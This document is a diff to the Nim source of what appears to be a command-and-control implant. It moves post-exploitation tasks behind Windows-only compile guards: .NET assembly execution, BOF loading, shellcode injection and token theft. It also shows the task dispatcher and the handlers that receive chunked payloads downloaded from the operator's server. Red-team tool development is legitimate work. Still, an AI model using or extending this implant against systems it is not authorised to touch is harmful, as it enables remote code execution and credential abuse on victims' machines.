@@ -7,11 +7,7 @@ import tasks/sleep
 import tasks/ls
 import tasks/download
 import tasks/upload
-import tasks/execute_assembly
-import tasks/inline_execute
-import tasks/powerpick
 import tasks/run
-import tasks/shinject
 import tasks/whoami
 import tasks/cat
 import tasks/mkdir
@@ -21,13 +17,17 @@ import tasks/cd
 import tasks/ps
 import tasks/pwd
 import tasks/rm
-import tasks/token_manager
-import tasks/make_token
-import tasks/steal_token
-import tasks/rev2self
 
 # Windows-only commands
 when defined(windows):
+  import tasks/execute_assembly
+  import tasks/inline_execute
+  import tasks/powerpick
+  import tasks/shinject
+  import tasks/token_manager
+  import tasks/make_token
+  import tasks/steal_token
+  import tasks/rev2self
   import tasks/screenshot
   import tasks/get_av
 
@@ -292,48 +292,72 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
         continue
       
       of "execute_assembly":
-        if agent.config.debug:
-          echo "[DEBUG] Starting execute-assembly (file download)"
-        response = executeAssembly(taskId, params)
-        agent.taskResponses.add(response)
-        
-        # Track as background task for file download
-        var state = BackgroundTaskState(
-          taskType: btExecuteAssembly,
-          path: "",
-          fileId: params["uuid"].getStr(),
-          totalChunks: 0,  # Will be set when we receive first chunk
-          currentChunk: 1,
-          fileData: @[],
-          params: params
-        )
-        agent.backgroundTasks[taskId] = state
-        continue
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Starting execute-assembly (file download)"
+          response = executeAssembly(taskId, params)
+          agent.taskResponses.add(response)
+          
+          # Track as background task for file download
+          var state = BackgroundTaskState(
+            taskType: btExecuteAssembly,
+            path: "",
+            fileId: params["uuid"].getStr(),
+            totalChunks: 0,  # Will be set when we receive first chunk
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+          continue
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "execute_assembly command is only available on Windows"
+          }
       
       of "inline_execute":
-        if agent.config.debug:
-          echo "[DEBUG] Starting inline_execute (BOF download)"
-        response = inlineExecute(taskId, params)
-        agent.taskResponses.add(response)
-        
-        # Track as background task for file download
-        var state = BackgroundTaskState(
-          taskType: btInlineExecute,
-          path: "",
-          fileId: params["uuid"].getStr(),
-          totalChunks: 0,  # Will be set when we receive first chunk
-          currentChunk: 1,
-          fileData: @[],
-          params: params
-        )
-        agent.backgroundTasks[taskId] = state
-        continue
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Starting inline_execute (BOF download)"
+          response = inlineExecute(taskId, params)
+          agent.taskResponses.add(response)
+          
+          # Track as background task for file download
+          var state = BackgroundTaskState(
+            taskType: btInlineExecute,
+            path: "",
+            fileId: params["uuid"].getStr(),
+            totalChunks: 0,  # Will be set when we receive first chunk
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+          continue
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "inline_execute command is only available on Windows"
+          }
       
       of "powerpick":
-        if agent.config.debug:
-          echo "[DEBUG] Executing powerpick command"
-        response = powerpick(taskId, params)
-        response["task_id"] = %taskId
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing powerpick command"
+          response = powerpick(taskId, params)
+          response["task_id"] = %taskId
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "powerpick command is only available on Windows"
+          }
       
       of "run":
         if agent.config.debug:
@@ -348,23 +372,31 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
         response["task_id"] = %taskId
       
       of "shinject":
-        if agent.config.debug:
-          echo "[DEBUG] Starting shinject (shellcode download)"
-        response = shinject(taskId, params)
-        agent.taskResponses.add(response)
-        
-        # Track as background task for file download
-        var state = BackgroundTaskState(
-          taskType: btShinject,
-          path: "",
-          fileId: params["uuid"].getStr(),
-          totalChunks: 0,
-          currentChunk: 1,
-          fileData: @[],
-          params: params
-        )
-        agent.backgroundTasks[taskId] = state
-        continue
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Starting shinject (shellcode download)"
+          response = shinject(taskId, params)
+          agent.taskResponses.add(response)
+          
+          # Track as background task for file download
+          var state = BackgroundTaskState(
+            taskType: btShinject,
+            path: "",
+            fileId: params["uuid"].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+          continue
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "shinject command is only available on Windows"
+          }
       
       of "whoami":
         if agent.config.debug:
@@ -413,19 +445,43 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
         response = rm(taskId, params)
       
       of "make_token":
-        if agent.config.debug:
-          echo "[DEBUG] Executing make_token command"
-        response = makeToken(taskId, params)
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing make_token command"
+          response = makeToken(taskId, params)
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "make_token command is only available on Windows"
+          }
       
       of "steal_token":
-        if agent.config.debug:
-          echo "[DEBUG] Executing steal_token command"
-        response = stealToken(taskId, params)
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing steal_token command"
+          response = stealToken(taskId, params)
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "steal_token command is only available on Windows"
+          }
       
       of "rev2self":
-        if agent.config.debug:
-          echo "[DEBUG] Executing rev2self command"
-        response = rev2self(taskId, params)
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing rev2self command"
+          response = rev2self(taskId, params)
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "rev2self command is only available on Windows"
+          }
       
       of "get_av":
         when defined(windows):
@@ -604,70 +660,73 @@ proc postResponses*(agent: var Agent) =
                   agent.backgroundTasks[taskId] = state
             
             of btExecuteAssembly:
-              # Process incoming file chunks for execute-assembly
-              if taskResp.hasKey("chunk_data"):
-                let chunkData = taskResp["chunk_data"].getStr()
-                let totalChunks = taskResp["total_chunks"].getInt()
-                state.totalChunks = totalChunks
-                
-                # Process the chunk and get next request or final result
-                let execResp = processExecuteAssemblyChunk(
-                  taskId, state.params, chunkData, totalChunks, 
-                  state.currentChunk, state.fileData
-                )
-                agent.taskResponses.add(execResp)
-                
-                if execResp.hasKey("completed") and execResp["completed"].getBool():
-                  agent.backgroundTasks.del(taskId)
-                  if agent.config.debug:
-                    echo "[DEBUG] Execute-assembly complete"
-                else:
-                  state.currentChunk += 1
-                  agent.backgroundTasks[taskId] = state
+              when defined(windows):
+                # Process incoming file chunks for execute-assembly
+                if taskResp.hasKey("chunk_data"):
+                  let chunkData = taskResp["chunk_data"].getStr()
+                  let totalChunks = taskResp["total_chunks"].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  # Process the chunk and get next request or final result
+                  let execResp = processExecuteAssemblyChunk(
+                    taskId, state.params, chunkData, totalChunks, 
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(execResp)
+                  
+                  if execResp.hasKey("completed") and execResp["completed"].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    if agent.config.debug:
+                      echo "[DEBUG] Execute-assembly complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
             
             of btInlineExecute:
-              # Process incoming file chunks for inline_execute (BOF)
-              if taskResp.hasKey("chunk_data"):
-                let chunkData = taskResp["chunk_data"].getStr()
-                let totalChunks = taskResp["total_chunks"].getInt()
-                state.totalChunks = totalChunks
-                
-                # Process the chunk and get next request or final result
-                let bofResp = processInlineExecuteChunk(
-                  taskId, state.params, chunkData, totalChunks,
-                  state.currentChunk, state.fileData
-                )
-                agent.taskResponses.add(bofResp)
-                
-                if bofResp.hasKey("completed") and bofResp["completed"].getBool():
-                  agent.backgroundTasks.del(taskId)
-                  if agent.config.debug:
-                    echo "[DEBUG] Inline_execute complete"
-                else:
-                  state.currentChunk += 1
-                  agent.backgroundTasks[taskId] = state
+              when defined(windows):
+                # Process incoming file chunks for inline_execute (BOF)
+                if taskResp.hasKey("chunk_data"):
+                  let chunkData = taskResp["chunk_data"].getStr()
+                  let totalChunks = taskResp["total_chunks"].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  # Process the chunk and get next request or final result
+                  let bofResp = processInlineExecuteChunk(
+                    taskId, state.params, chunkData, totalChunks,
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(bofResp)
+                  
+                  if bofResp.hasKey("completed") and bofResp["completed"].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    if agent.config.debug:
+                      echo "[DEBUG] Inline_execute complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
             
             of btShinject:
-              # Process incoming file chunks for shinject
-              if taskResp.hasKey("chunk_data"):
-                let chunkData = taskResp["chunk_data"].getStr()
-                let totalChunks = taskResp["total_chunks"].getInt()
-                state.totalChunks = totalChunks
-                
-                # Process the chunk and get next request or final result
-                let injectResp = processShinjectChunk(
-                  taskId, state.params, chunkData, totalChunks,
-                  state.currentChunk, state.fileData
-                )
-                agent.taskResponses.add(injectResp)
-                
-                if injectResp.hasKey("completed") and injectResp["completed"].getBool():
-                  agent.backgroundTasks.del(taskId)
-                  if agent.config.debug:
-                    echo "[DEBUG] Shinject complete"
-                else:
-                  state.currentChunk += 1
-                  agent.backgroundTasks[taskId] = state
+              when defined(windows):
+                # Process incoming file chunks for shinject
+                if taskResp.hasKey("chunk_data"):
+                  let chunkData = taskResp["chunk_data"].getStr()
+                  let totalChunks = taskResp["total_chunks"].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  # Process the chunk and get next request or final result
+                  let injectResp = processShinjectChunk(
+                    taskId, state.params, chunkData, totalChunks,
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(injectResp)
+                  
+                  if injectResp.hasKey("completed") and injectResp["completed"].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    if agent.config.debug:
+                      echo "[DEBUG] Shinject complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
     except:
       if agent.config.debug:
         echo "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()
